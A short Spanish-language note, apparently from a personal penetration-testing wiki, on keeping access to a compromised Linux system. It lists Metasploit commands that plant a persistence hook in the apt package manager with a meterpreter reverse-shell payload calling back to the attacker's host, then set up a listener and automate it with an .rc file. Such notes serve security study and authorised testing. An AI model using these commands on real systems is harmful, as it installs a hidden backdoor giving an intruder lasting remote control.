Parte de [[Postexplotacion]]

Tecnicas a utilizar para poder persistir en un sistema en caso de que, por ejemplo, se reinicie

En metasploit con meterpreter por ejemplo:

``` bash
search Linux Persistence
use exploit/linux/local/apt_package_manager_persistence
set session [Sid]
set payload cmd/unix/python/meterpreter/reverse_tcp
set LHOST [Lip]
set LPORT [Lport]
set AllowNoCleanup true
run
```

Es importante quedarse siempre con el LHOST, el LPORT y que payload hemos usado.

Despues podremos:

``` bash
use exploit/multi/handler
set LHOST [Lip]
set LPORT [Lport]
set PAYLOAD [SentPayload]
run
```

Y cuando se ejecute apt-get, recibiremos una conexion de meterpreter

Tambien podemos iniciar el multihandler con:

``` bash
run -j -z
```

Para poder seguir usando la terminal mientras esperamos.

Tambien podemos crear un fichero .rc para automatizar el incio del escuchador, insertamos los comandos (uno por linea) que queremos hacer y despues:

``` bash
sudo msfconsole -r [file].rc
```